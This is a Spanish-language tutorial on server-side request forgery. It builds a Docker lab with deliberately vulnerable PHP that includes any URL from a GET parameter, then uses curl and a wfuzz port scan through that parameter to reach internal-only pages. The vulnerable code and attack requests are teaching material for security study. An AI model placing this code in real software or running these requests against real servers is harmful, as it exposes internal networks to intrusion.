# Server-Side Request Forgery (SSRF)

El **Server-Side Request Forgery** (**SSRF**) es una vulnerabilidad de seguridad en la que un atacante puede forzar a un servidor web para que realice solicitudes HTTP en su nombre.

En un ataque de SSRF, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para enviar una solicitud HTTP a un servidor web. El atacante manipula la solicitud para que se dirija a un servidor vulnerable o a una red interna a la que el servidor web tiene acceso.

El ataque de SSRF puede permitir al atacante acceder a información confidencial, como contraseñas, claves de API y otros datos sensibles, y también puede llegar a permitir al atacante (en función del escenario) ejecutar comandos en el servidor web o en otros servidores en la red interna.

Una de las **diferencias** clave entre el **SSRF** y el **CSRF** es que el SSRF se ejecuta en el servidor web en lugar del navegador del usuario. El atacante **no necesita engañar a un usuario legítimo** para hacer clic en un enlace malicioso, ya que puede enviar la solicitud HTTP directamente al servidor web desde una fuente externa.

Para prevenir los ataques de SSRF, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario y limiten el acceso del servidor web a los recursos de la red interna. Además, los servidores web deben ser configurados para limitar el acceso a los recursos sensibles y restringir el acceso de los usuarios no autorizados.

En esta clase, estaremos utilizando **Docker** para crear **redes personalizadas** en las que podremos simular un escenario de **red interna**. En esta red interna, intentaremos a través del SSRF apuntar a un recurso existente que no es accesible externamente, lo que nos permitirá explorar y comprender mejor la explotación de esta vulnerabilidad.

Para crear una nueva red en Docker, podemos utilizar el siguiente comando:

➜ `docker network create --subnet=<subnet> <nombre_de_red>`

Donde:

* **subnet**: es la dirección IP de la subred de la red que estamos creando. Es importante tener en cuenta que esta dirección IP debe ser única y no debe entrar en conflicto con otras redes o subredes existentes en nuestro sistema.
* **nombre\_de\_red**: es el nombre que le damos a la red que estamos creando.

Además de los campos mencionados anteriormente, también podemos utilizar la opción ‘**–driver**‘ en el comando ‘docker network create’ para especificar el controlador de red que deseamos utilizar.

Por ejemplo, si queremos crear una red de tipo “**bridge**“, podemos utilizar el siguiente comando:

➜ `docker network create --subnet=<subnet> --driver=bridge <nombre_de_red>`

En este caso, estamos utilizando la opción ‘**–driver=bridge**‘ para indicar que deseamos crear una red de tipo “**bridge**“. La opción –driver nos permite especificar el controlador de red que deseamos utilizar, que puede ser “**bridge**“, “**overlay**“, “**macvlan**“, “**ipvlan**” u otro controlador compatible con Docker.

### 1: Prueba de concepto

* Iniciar **contenedor** de ubuntu con **docker**:

```bash
❯ docker pull ubuntu:latest
❯ docker run -dit --name ssrf_1 ubuntu
❯ docker exec -it ssrf_1 bash
root@6a202eaefc7b:/# apt update
root@6a202eaefc7b:/# apt install apache2 php nano python3 lsof -y
```

* Iniciar **servidor** web con **apache2**:

```bash
root@6a202eaefc7b:/# lsof -i:80
root@6a202eaefc7b:/# service apache2 start
root@6a202eaefc7b:/# lsof -i:80
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
apache2 9804 root    3u  IPv4 109939      0t0  TCP *:http (LISTEN)
```

* Crear archivo php para ver el contenido de un dominio especificado por parámetro:

```bash
root@6a202eaefc7b:/# cd /var/www/html/
root@6a202eaefc7b:/var/www/html# rm index.html 
root@6a202eaefc7b:/var/www/html# nano utility.php
```

```php
<?php
	if(isset($_GET['url'])){
		$url = $_GET['url'];
		echo "\n[+] Listando el contenido de la web " . $url . ":\n\n";
		include($url);
	} else {
		echo "\n[!] No se ha proporcionado ningun valor del parametro URL\n\n";
	}
?>
```

* Editar archivo php.ini para **habilitar** la **inclusión** de url's:

```bash
root@6a202eaefc7b:/var/www/html# nano /etc/php/8.1/apache2/php.ini
```

* Buscar en el archivo allow\_url\_include y cambiar el valor a On para habilitar-lo:

```php
allow_url_include = On
```

* Reiniciar el servicio **apache2** para aplicar los cambios:

```bash
root@6a202eaefc7b:/var/www/html# service apache2 restart
```

* Crear archivo html para crear un panel de autentificación (login) que simula el de producción:

```bash
root@6a202eaefc7b:/var/www/html# nano login.html
```

```html
<!DOCTYPE html> 
<html> 
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title> Login Page </title>
<style> 
Body {
  font-family: Calibri, Helvetica, sans-serif;
  background-color: pink;
}
button { 
       background-color: #4CAF50; 
       width: 100%;
        color: orange; 
        padding: 15px; 
        margin: 10px 0px; 
        border: none; 
        cursor: pointer; 
         } 
 form { 
        border: 3px solid #f1f1f1; 
    } 
 input[type=text], input[type=password] { 
        width: 100%; 
        margin: 8px 0;
        padding: 12px 20px; 
        display: inline-block; 
        border: 2px solid green; 
        box-sizing: border-box; 
    }
 button:hover { 
        opacity: 0.7; 
    } 
  .cancelbtn { 
        width: auto; 
        padding: 10px 18px;
        margin: 10px 5px;
    } 
      
   
 .container { 
        padding: 25px; 
        background-color: lightblue;
    } 
</style> 
</head>  
<body>  
    <center> <h1> Student Login Form (PRO)</h1> </center> 
    <form>
        <div class="container"> 
            <label>Username : </label> 
            <input type="text" placeholder="Enter Username" name="username" required>
            <label>Password : </label> 
            <input type="password" placeholder="Enter Password" name="password" required>
            <button type="submit">Login</button> 
            <input type="checkbox" checked="checked"> Remember me 
            <button type="button" class="cancelbtn"> Cancel</button> 
            Forgot <a href="#"> password? </a> 
        </div> 
    </form>   
</body>   
</html>
```

* Copiar el login.html en /tmp para crear otro que simule la pagina de pre producción:

```bash
root@6a202eaefc7b:/var/www/html# cp login.html /tmp/
root@6a202eaefc7b:/var/www/html# cd /tmp/
root@6a202eaefc7b:/tmp# ls
login.html
```

* Levantar servidor web con python donde esta la pagina en **pre producción** y que no se puede ver públicamente si no que solamente la puede ver la propia maquina por el puerto 4646:

```bash
root@6a202eaefc7b:/tmp# ls
login.html
root@6a202eaefc7b:/tmp# python3 -m http.server 4646 --bind 127.0.0.1
Serving HTTP on 127.0.0.1 port 4646 (http://127.0.0.1:4646/) ...
```

#### Ejemplo de SSRF

Con el parámetro url de utility.php podemos poner dominios como por ejemplo google.com etc pero que pasa si apuntamos como url hacia la propia maquina y tiene un puerto interno abierto con un servidor web pues que podemos llegar a haver el contenido de este y se pude hacer de 2 formas.

* Con el nombre **localhost** que hace referencia a la propia **maquina**:\
  **➜** `http://172.17.0.2/utility.php?url=http://localhost:4646/login.html`
* Con la IP **127.0.0.1** que hace referencia a la propia **maquina**:\
  **➜** `http://172.17.0.2/utility.php?url=http://127.0.0.1:4646/login.html`

Y como podemos llegar a ver si la propia maquina tiene puertos internos abiertos????

Pues haciendo fuzzing con wfuzz por ejemplo para poder ver del 1 al 65535 que puertos internos tiene abiertos la propia maquina:

```bash
❯ wfuzz -c --hc=404 --hl=3 -t 200 -z range,1-65535 -u 'http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ'

Target: http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                           
=====================================================================

000000080:   200        19 L     68 W       1011 Ch     "80"                                                              
000004646:   200        18 L     39 W       403 Ch      "4646"                                                            
000008719:   200        3 L      8 W        61 Ch       "8719"  
```

### 2: Prueba de concepto

* Crear interfaz de red con docker:

```bash
❯ docker network create --driver=bridge network1 --subnet=10.10.0.0/24
```

* Crear contenedor que simula donde estará la pagina de producción y que tiene dos interfaces:

```bash
❯ docker run -dit --name PRO ubuntu
❯ docker network connect network1 PRO
```

* Crear segundo contenedor que estará en la red creada anteriormente:

```bash
❯ docker run -dit --name PRE --network=network1 ubuntu
```

* Crear tercer contendedor que simula la de atacante que estará en la red creada anteriormente:

```bash
❯ docker run -dit --name ATTACKER ubuntu
```

#### Configurar maquina PRO para que simule la pagina en producción

```bash
❯ docker exec -it PRO bash
root@72883f147f98:/# apt install apache2 php nano -y
root@72883f147f98:/# service apache2 start
root@72883f147f98:/# cd /var/www/html/
root@72883f147f98:/var/www/html# nano utility.php
```

* Crear archivo php para poder incluir en el parámetro url dominios:

```php
<?php
	include($_GET['url']);
?>
```

* Editar archivo php.ini para **habilitar** la **inclusión** de url's:

```bash
root@72883f147f98:/var/www/html# nano /etc/php/8.1/apache2/php.ini
```

* Buscar en el archivo allow\_url\_include y cambiar el valor a On para habilitar-lo:

```php
allow_url_include = On
```

* Reiniciar el servicio **apache2** para aplicar los cambios:

```bash
root@72883f147f98:/var/www/html# service apache2 restart
```

* Crear archivo html para simular un panel de autentificación:

```html
<!DOCTYPE html> 
<html> 
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title> Login Page </title>
<style> 
Body {
  font-family: Calibri, Helvetica, sans-serif;
  background-color: pink;
}
button { 
       background-color: #4CAF50; 
       width: 100%;
        color: orange; 
        padding: 15px; 
        margin: 10px 0px; 
        border: none; 
        cursor: pointer; 
         } 
 form { 
        border: 3px solid #f1f1f1; 
    } 
 input[type=text], input[type=password] { 
        width: 100%; 
        margin: 8px 0;
        padding: 12px 20px; 
        display: inline-block; 
        border: 2px solid green; 
        box-sizing: border-box; 
    }
 button:hover { 
        opacity: 0.7; 
    } 
  .cancelbtn { 
        width: auto; 
        padding: 10px 18px;
        margin: 10px 5px;
    } 
      
   
 .container { 
        padding: 25px; 
        background-color: lightblue;
    } 
</style> 
</head>  
<body>  
    <center> <h1> Student Login Form (PRO)</h1> </center> 
    <form>
        <div class="container"> 
            <label>Username : </label> 
            <input type="text" placeholder="Enter Username" name="username" required>
            <label>Password : </label> 
            <input type="password" placeholder="Enter Password" name="password" required>
            <button type="submit">Login</button> 
            <input type="checkbox" checked="checked"> Remember me 
            <button type="button" class="cancelbtn"> Cancel</button> 
            Forgot <a href="#"> password? </a> 
        </div> 
    </form>   
</body>   
</html>
```

#### Configurar maquina PRE para que simule la pagina en pre producción

```bash
❯ docker exec -it PRE bash
root@af05671bedd2:/# apt update
root@af05671bedd2:/# apt install nano python3 -y
root@af05671bedd2:/# cd /tmp/
root@af05671bedd2:/tmp# nano index.html
```

* Crear archivo html para simular pagina de pre producción o la pagina que externamente no se puede llegar a ver:

```html
* NO SE PUEDE VER EXTERNAMENTE!!!! *
```

* Levantar servidor web con python donde estará la página creada anteriormente por el puerto 6666:

```bash
root@af05671bedd2:/tmp# python3 -m http.server 6666
Serving HTTP on 0.0.0.0 port 6666 (http://0.0.0.0:6666/) ...
```

Ahora desde el contenedor del atacante instalamos curl para poder hacer peticiones web:

```bash
❯ docker exec -it ATTACKER bash
root@6e9f92039f81:/# apt update
root@6e9f92039f81:/# apt install curl -y
```

Con curl haremos una petición donde apuntaremos desde la maquina de PRO a la maquina de PRE para poder llegar a ver a través del parámetro url la pagina de la maquina PRE sin poder llegar a verla externamente:

```bash
root@6e9f92039f81:/# curl http://10.10.0.3:6666 // *NO FUNCIONA* //
root@6e9f92039f81:/# curl "http://172.17.0.2/utility.php?url=http://10.10.0.3:6666"
* NO SE PUEDE VER EXTERNAMENTE!!!! *
```

Y como anteriormente como hemos echo podemos hacer fuzzing para ver que puertos tiene abiertos la maquina con wfuzz por ejemplo.
